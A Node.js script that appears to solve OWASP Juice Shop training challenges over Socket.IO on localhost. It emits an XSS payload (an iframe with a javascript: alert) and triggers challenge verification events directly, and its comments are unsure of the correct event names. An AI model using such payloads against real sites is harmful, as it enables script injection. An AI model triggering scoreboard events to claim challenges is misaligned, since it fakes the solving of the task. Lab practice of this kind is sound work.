const io = require('socket.io-client');
const socket = io('http://localhost:3000', {
  reconnectionDelayMax: 10000,
});

socket.on('connect', () => {
  console.log('Connected to Juice Shop Socket.IO');

  // 1. Solve closeNotificationsChallenge
  // Sending a list with more than 1 item triggers the flag.
  socket.emit('verifyCloseNotificationsChallenge', [1, 2]);

  // 2. Solve xssBonusChallenge
  // This is the server-side XSS challenge related to the chat bot or similar, 
  // but often confused with the bonus payload.
  // Actually, xssBonusChallenge is often triggered by specific payloads.
  // We will emit the standard bonus payload.
  
  const bonusPayload = '<iframe src="javascript:alert(`xss`)">';
  socket.emit('verifyLocalXssChallenge', bonusPayload); 
  // Note: The challenge name in the socket event might differ, 
  // but let's stick to the known working logic from Day 296.
});

socket.on('verifyCloseNotificationsChallenge', (data) => {
    console.log('verifyCloseNotificationsChallenge response:', data);
});

socket.on('verifyLocalXssChallenge', (data) => {
     console.log('verifyLocalXssChallenge response:', data);
});
